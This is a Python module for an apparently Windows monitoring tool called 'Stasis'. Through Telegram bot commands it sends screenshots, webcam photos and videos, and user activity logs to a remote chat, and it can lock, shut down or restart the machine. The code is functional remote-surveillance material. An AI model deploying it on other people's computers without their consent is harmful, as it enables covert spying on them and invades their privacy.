# telegram_client.py
import os
import requests
import time
from src.utils.logger import setup_logger
from src.core.system_status import get_status_text
from src.core.screenshot import capture_screenshot
from src.core.system_actions import shutdown_system, restart_system, lock_system
from src.config.config_loader import load_config
from src.core.webcam import capture_webcam, record_video
CONFIG = load_config()

TELEGRAM_BOT_TOKEN = CONFIG["telegram"]["bot_token"]
TELEGRAM_CHAT_ID = str(CONFIG["telegram"]["chat_id"])  # ensure string
REQUEST_TIMEOUT = 10

logger = setup_logger()


class TelegramClient:
    def __init__(self):
        self.base_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}"
        self.offset = self._get_latest_update_id()

    def _get_latest_update_id(self):
        try:
            response = requests.get(
                f"{self.base_url}/getUpdates",
                timeout=REQUEST_TIMEOUT
            )
            response.raise_for_status()
            updates = response.json().get("result", [])
            if updates:
                return updates[-1]["update_id"] + 1
        except Exception:
            pass
        return None

    def send_message(self, text: str, retries=3, delay=5) -> bool:
        url = f"{self.base_url}/sendMessage"
        payload = {
            "chat_id": TELEGRAM_CHAT_ID,
            "text": text,
            "parse_mode": "HTML"
        }

        for attempt in range(1, retries + 1):
            try:
                response = requests.post(url, json=payload, timeout=REQUEST_TIMEOUT)
                response.raise_for_status()
                logger.info("Telegram message sent")
                return True
            except requests.RequestException as e:
                logger.warning(f"Telegram send attempt {attempt} failed: {e}")
                time.sleep(delay)

        logger.error("All Telegram send attempts failed")
        return False

    def send_photo(self, photo_path: str, caption: str = "") -> bool:
        url = f"{self.base_url}/sendPhoto"

        try:
            with open(photo_path, "rb") as photo:
                files = {"photo": photo}
                data = {
                    "chat_id": TELEGRAM_CHAT_ID,
                    "caption": caption
                }

                response = requests.post(
                    url,
                    files=files,
                    data=data,
                    timeout=REQUEST_TIMEOUT
                )
                response.raise_for_status()

            logger.info("Screenshot sent successfully")
            return True

        except Exception as e:
            logger.error(f"Failed to send screenshot: {e}")
            return False

    def send_video(self, video_path: str, caption: str = "") -> bool:
        url = f"{self.base_url}/sendVideo"

        # Ensure we use a slightly longer timeout for the actual data transfer
        # (connect timeout, read/write timeout)
        upload_timeout = (15, 600)

        try:
            # Open the file in binary mode
            with open(video_path, "rb") as video_file:
                # Using a dictionary for files forces requests to use multipart/form-data
                files = {
                    "video": (os.path.basename(video_path), video_file, 'video/mp4')
                }
                data = {
                    "chat_id": TELEGRAM_CHAT_ID,
                    "caption": caption,
                    "supports_streaming": True
                }

                # We perform the post inside the 'with' block to keep the file handle open
                response = requests.post(
                    url,
                    files=files,
                    data=data,
                    timeout=upload_timeout
                )
                response.raise_for_status()

            logger.info("Video sent successfully")
            return True

        except (requests.exceptions.ConnectionError, requests.exceptions.Timeout) as e:
            logger.error(f"Network timeout/interruption: {e}")
            # Optional: Try sending a message to your bot that the file was too large
            self.send_message("⚠️ Video recorded but upload timed out. Try a shorter duration.")
            return False
        except Exception as e:
            logger.error(f"Unexpected error sending video: {e}")
            return False

    def send_document(self, file_path: str, caption: str = "") -> bool:
        url = f"{self.base_url}/sendDocument"
        try:
            with open(file_path, "rb") as doc:
                files = {"document": doc}
                data = {"chat_id": TELEGRAM_CHAT_ID, "caption": caption}
                response = requests.post(url, files=files, data=data, timeout=30)
                response.raise_for_status()
            return True
        except Exception as e:
            logger.error(f"Failed to send log file: {e}")
            return False

    def listen_forever(self):
        logger.info("Entering persistent Telegram listener")

        backoff = 2
        max_backoff = 60

        while True:
            try:
                response = requests.get(
                    f"{self.base_url}/getUpdates",
                    params={"timeout": 30, "offset": self.offset},
                    timeout=40
                )

                # Handle Telegram rate limiting
                if response.status_code == 429:
                    retry_after = response.json().get("parameters", {}).get("retry_after", 10)
                    logger.warning(f"Rate limited. Sleeping {retry_after}s")
                    time.sleep(retry_after)
                    continue

                response.raise_for_status()
                updates = response.json().get("result", [])

                # Reset backoff on success
                backoff = 2

                for update in updates:
                    self.offset = update["update_id"] + 1
                    message = update.get("message", {})

                    text = message.get("text", "").strip()
                    chat_id = str(message.get("chat", {}).get("id", "")).strip()

                    if chat_id != TELEGRAM_CHAT_ID:
                        logger.warning(f"Unauthorized chat ID: {chat_id}")
                        continue

                    command = text.lower()

                    # -------------------
                    # STATUS
                    # -------------------
                    if command == "/ping":
                        self.send_message(get_status_text())

                    # -------------------
                    # SCREENSHOT
                    # -------------------
                    elif command == "/screenshot":
                        path = capture_screenshot()
                        if path:
                            self.send_photo(path, caption="Current Screen")
                            try:
                                os.remove(path)
                            except Exception:
                                pass
                        else:
                            self.send_message("Screenshot failed")

                    # -------------------
                    # LOCK
                    # -------------------
                    elif command == "/lock":
                        self.send_message("Locking system...")
                        lock_system()

                    # -------------------
                    # SHUTDOWN
                    # -------------------
                    elif command == "/shutdown":
                        self.send_message(
                            "Shutdown requested.\nSend `/shutdown confirm` to proceed."
                        )

                    elif command == "/shutdown confirm":
                        self.send_message("Shutting down now...")
                        shutdown_system()

                    # -------------------
                    # RESTART
                    # -------------------
                    elif command == "/restart":
                        self.send_message(
                            "Restart requested.\nSend `/restart confirm` to proceed."
                        )

                    elif command == "/restart confirm":
                        self.send_message("Restarting now...")
                        restart_system()

                    # -------------------
                    # WEBCAM SNAPSHOT
                    # -------------------
                    elif command == "/camera":
                        path = capture_webcam()
                        if path:
                            self.send_photo(path, caption="Webcam Snapshot")
                            try:
                                os.remove(path)
                            except Exception:
                                pass
                        else:
                            self.send_message("Failed to access webcam.")

                    # -------------------
                    # GET LOGS
                    # -------------------
                    elif command == "/getlog":
                        import glob

                        app_name = "Stasis"
                        base_path = os.path.join(
                            os.environ.get("PROGRAMDATA", "C:\\ProgramData"),
                            app_name
                        )

                        patterns = [
                            os.path.join(base_path, "activity_log_*.csv"),
                            os.path.join(base_path, "system_file_activity_*.csv"),
                        ]

                        found_any = False

                        for pattern in patterns:
                            for log_path in glob.glob(pattern):
                                if self.send_document(
                                        log_path,
                                        caption=f"Activity Log: {os.path.basename(log_path)}"
                                ):
                                    found_any = True

                        if not found_any:
                            self.send_message("No log files found yet.")

                    # -------------------
                    # VIDEO RECORDING
                    # -------------------
                    elif command.startswith("/video"):
                        parts = command.split()
                        duration = 10

                        if len(parts) > 1 and parts[1].isdigit():
                            duration = int(parts[1])

                        self.send_message(f"Recording {duration}s video...")
                        path = record_video(duration)

                        if path:
                            self.send_video(path, caption=f"Webcam Clip ({duration}s)")
                            try:
                                os.remove(path)
                            except Exception:
                                pass
                        else:
                            self.send_message("Video recording failed")

            except requests.exceptions.ReadTimeout:
                # Expected during long polling
                continue

            except requests.exceptions.ConnectionError:
                logger.warning(f"Network lost. Retrying in {backoff}s")
                time.sleep(backoff)
                backoff = min(backoff * 2, max_backoff)

            except Exception as e:
                logger.error(f"Listener error: {e}")
                time.sleep(backoff)
                backoff = min(backoff * 2, max_backoff)